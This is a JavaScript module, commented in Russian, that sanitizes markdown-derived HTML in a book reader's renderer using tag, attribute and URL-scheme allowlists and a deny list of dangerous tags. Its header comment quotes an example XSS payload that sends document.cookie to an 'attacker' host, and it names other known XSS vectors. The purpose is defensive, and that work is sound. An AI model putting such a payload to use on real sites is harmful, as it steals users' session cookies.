// @ts-check
/**
 * Минимальный DOM-based HTML sanitizer для renderer'а.
 *
 * Цель: защитить reader от XSS-инъекций в book.md. Книга — это файл, который
 * пользователь импортировал извне; парсер выдаёт markdown, который через
 * marked.parse становится HTML. Без санитизации этот HTML напрямую попадал в
 * `innerHTML` (`renderer/dom.js:el(... { html })`), и любой `<img src=https://attacker
 * onerror=fetch('https://attacker/?'+document.cookie)>` или `<form action=https://...>`
 * исполнялся в renderer'е с привилегиями `window.api`.
 *
 * Стратегия:
 *   1. Парсим HTML через `DOMParser` — получаем inert document (script/onload
 *      НЕ исполняются при парсинге, это спецификация HTML5).
 *   2. Идём по дереву DFS. Каждый элемент:
 *        - tag не в TAG_ALLOWLIST → удаляем (children поднимаем к родителю)
 *        - атрибут не в whitelist для этого tag → удаляем
 *        - href/src со схемой не в URL_SCHEME_ALLOWLIST → удаляем атрибут
 *        - все on*-атрибуты удаляем безусловно
 *   3. Сериализуем обратно через innerHTML root'а.
 *
 * Контракт безопасности: НЕТ user-controlled пути от book.md → eval/script
 * exec/fetch к внешнему домену. CSP defense-in-depth, но не единственная
 * линия.
 *
 * Принцип whitelist'а: всё, что не разрешено явно — запрещено. При появлении
 * новой потребности (например, `<svg>` для math-формул) — сначала security
 * review, потом расширение списка + регрессионный тест.
 */

/**
 * Разрешённые HTML-теги. Только те, что markdown реально генерирует +
 * пара полезных в рендере (details/summary/nav для ToC). Запрещены:
 * script/iframe/object/embed/form/input/button/textarea/select/option/
 * meta/link/base/style/svg/math (известные XSS-векторы или не нужны).
 */
export const TAG_ALLOWLIST = new Set([
  /* text-level */
  "a", "abbr", "b", "br", "cite", "code", "del", "em", "i", "ins", "kbd",
  "mark", "q", "s", "samp", "small", "span", "strong", "sub", "sup", "u", "var",
  /* block-level */
  "address", "article", "aside", "blockquote", "div", "figcaption", "figure",
  "footer", "h1", "h2", "h3", "h4", "h5", "h6", "header", "hgroup", "hr",
  "main", "nav", "p", "pre", "section",
  /* lists */
  "dd", "dl", "dt", "li", "ol", "ul",
  /* tables */
  "caption", "col", "colgroup", "table", "tbody", "td", "tfoot", "th", "thead", "tr",
  /* media */
  "img",
  /* interactive (passive) */
  "details", "summary",
]);

/**
 * Глобально разрешённые атрибуты — присутствуют на любом теге.
 * Намеренно НЕТ: `style` (CSS-injection через `behavior:url(...)`,
 * `expression()`, `-moz-binding`); `srcdoc`; любых `on*`.
 */
const GLOBAL_ATTRS = new Set([
  "id", "class", "title", "lang", "dir", "role", "tabindex",
  "aria-label", "aria-labelledby", "aria-describedby", "aria-hidden",
  "aria-modal", "aria-live", "aria-controls", "aria-expanded", "aria-current",
]);

/**
 * Per-tag разрешённые атрибуты. Объединяются с GLOBAL_ATTRS.
 * Whitelist минимально-достаточный: всё, что нужно reader'у/marked.
 */
const TAG_ATTRS = /** @type {Record<string, ReadonlySet<string>>} */ ({
  a: new Set(["href", "name", "rel", "target"]),
  img: new Set(["src", "alt", "width", "height", "loading", "decoding"]),
  ol: new Set(["start", "reversed", "type"]),
  li: new Set(["value"]),
  details: new Set(["open"]),
  td: new Set(["colspan", "rowspan", "headers", "scope"]),
  th: new Set(["colspan", "rowspan", "headers", "scope", "abbr"]),
  col: new Set(["span"]),
  colgroup: new Set(["span"]),
  table: new Set(["summary"]),
  blockquote: new Set(["cite"]),
  q: new Set(["cite"]),
  ins: new Set(["cite", "datetime"]),
  del: new Set(["cite", "datetime"]),
});

/**
 * Разрешённые URL-схемы. `bibliary-asset:` нужен для CAS-картинок reader'а.
 * `mailto:` — для legitimate book metadata. `data:image/(png|jpeg|gif|webp)`
 * допускается для img.src (см. isSafeImageDataUri).
 *
 * НИКОГДА: `javascript:`, `vbscript:`, `data:text/html`, `file:`,
 * `chrome:`, `about:`, `blob:`, `ms-windows-store:`.
 */
export const URL_SCHEME_ALLOWLIST = new Set([
  "http:",
  "https:",
  "mailto:",
  "bibliary-asset:",
]);

/**
 * Допустимые data: MIME-типы для img.src. SVG ИСКЛЮЧЁН — известный XSS
 * вектор (внутри svg можно положить script).
 */
const SAFE_DATA_IMAGE_RE = /^data:image\/(png|jpeg|gif|webp);base64,[A-Za-z0-9+/=]+$/i;

/**
 * @param {string} url
 * @returns {boolean}
 */
export function isSafeUrl(url) {
  if (typeof url !== "string") return false;
  /* Защита от unicode-spoofing и control chars. */
  if (/[\u0000-\u001f\u007f]/.test(url)) return false;
  /* Hash-only / relative path-only безопасно (anchor link, относительный путь
     внутри renderer'а). */
  if (url.startsWith("#") || url.startsWith("/")) return true;
  let parsed;
  try {
    /* Используем base чтобы относительные URL парсились без выброса. */
    parsed = new URL(url, "https://bibliary.local/");
  } catch {
    return false;
  }
  return URL_SCHEME_ALLOWLIST.has(parsed.protocol);
}

/**
 * Безопасен ли URL для `<img src>`. Расширяет isSafeUrl допуском
 * `data:image/(png|jpeg|gif|webp)`.
 * @param {string} url
 * @returns {boolean}
 */
export function isSafeImageSrc(url) {
  if (typeof url !== "string") return false;
  if (SAFE_DATA_IMAGE_RE.test(url)) return true;
  return isSafeUrl(url);
}

/**
 * Можно ли сохранить атрибут `attrName` на теге `tagName`.
 * @param {string} tagName lowercase
 * @param {string} attrName lowercase
 * @returns {boolean}
 */
export function isAllowedAttr(tagName, attrName) {
  /* Жёсткий запрет: любые event handlers (on*) и srcdoc/formaction/style. */
  if (attrName.startsWith("on")) return false;
  if (attrName === "srcdoc" || attrName === "formaction" || attrName === "style") return false;
  /* xml:lang — единственное разрешённое namespaced (legitimate i18n).
     Fix 2026-05-10: раньше эта строка была early-rejected ниже, и xml:lang
     не попадал в GLOBAL_ATTRS → возвращал false вопреки документированному
     поведению. Теперь явный allow ДО namespace-check. */
  if (attrName === "xml:lang") return true;
  /* Все остальные namespaced (xlink:href, xml:base, xmlns, и т.д.) запрещены. */
  if (attrName.includes(":")) return false;
  if (GLOBAL_ATTRS.has(attrName)) return true;
  const perTag = TAG_ATTRS[tagName];
  return perTag ? perTag.has(attrName) : false;
}

/**
 * Sanitize: парсит входной HTML через DOMParser и удаляет всё, что не в
 * whitelist'е. Возвращает безопасную HTML-строку. Браузер-only API
 * (DOMParser). В тестах без DOM используйте pure helpers выше.
 *
 * @param {string} dirtyHtml
 * @returns {string}
 */
export function sanitizeHtml(dirtyHtml) {
  if (typeof dirtyHtml !== "string" || dirtyHtml.length === 0) return "";
  /* DOMParser создаёт inert document — script-теги НЕ исполняются при парсинге,
     это специально по HTML5 спецификации. */
  const doc = new DOMParser().parseFromString(`<!doctype html><body>${dirtyHtml}`, "text/html");
  const root = doc.body;
  if (!root) return "";

  /* Идём по дереву post-order. Используем NodeFilter SHOW_ELEMENT.
     ВАЖНО: при удалении элемента TreeWalker может пропустить детей; мы
     подменяем элемент на DocumentFragment с unwrapped children, чтобы
     контент текста сохранился. Скрипт-подобные теги вырезаем целиком. */
  const KILL_WHOLE = new Set(["script", "style", "iframe", "object", "embed", "form",
    "input", "button", "textarea", "select", "option", "meta", "link", "base",
    "svg", "math", "frame", "frameset", "applet"]);

  /** @param {Element} el */
  const walk = (el) => {
    /* Сначала children — иначе при unwrap'е walker сбоит по live-collection. */
    const children = Array.from(el.children);
    for (const ch of children) walk(ch);

    const tag = el.tagName.toLowerCase();

    /* Опасные теги — выпиливаем целиком, content тоже (script/style/iframe). */
    if (KILL_WHOLE.has(tag)) {
      el.remove();
      return;
    }

    /* Не в whitelist — unwrap (сохраняем текстовый контент детей). */
    if (!TAG_ALLOWLIST.has(tag)) {
      const parent = el.parentNode;
      if (!parent) {
        el.remove();
        return;
      }
      while (el.firstChild) parent.insertBefore(el.firstChild, el);
      parent.removeChild(el);
      return;
    }

    /* Tag разрешён — фильтруем атрибуты. */
    const attrs = Array.from(el.attributes);
    for (const attr of attrs) {
      const name = attr.name.toLowerCase();
      if (!isAllowedAttr(tag, name)) {
        el.removeAttribute(attr.name);
        continue;
      }
      /* URL-атрибуты: проверяем схему. */
      if (name === "href") {
        if (!isSafeUrl(attr.value)) el.removeAttribute(attr.name);
        continue;
      }
      if (name === "src") {
        const ok = tag === "img" ? isSafeImageSrc(attr.value) : isSafeUrl(attr.value);
        if (!ok) el.removeAttribute(attr.name);
        continue;
      }
      if (name === "cite") {
        if (!isSafeUrl(attr.value)) el.removeAttribute(attr.name);
        continue;
      }
    }

    /* `<a target=_blank>` без `rel=noopener` — leak window.opener. Принудительно
       выставляем rel чтобы внешняя страница не получила доступ к window. */
    if (tag === "a" && el.getAttribute("target") === "_blank") {
      const existingRel = el.getAttribute("rel") ?? "";
      const tokens = new Set(existingRel.split(/\s+/).filter(Boolean));
      tokens.add("noopener");
      tokens.add("noreferrer");
      el.setAttribute("rel", Array.from(tokens).join(" "));
    }
  };

  walk(root);
  return root.innerHTML;
}
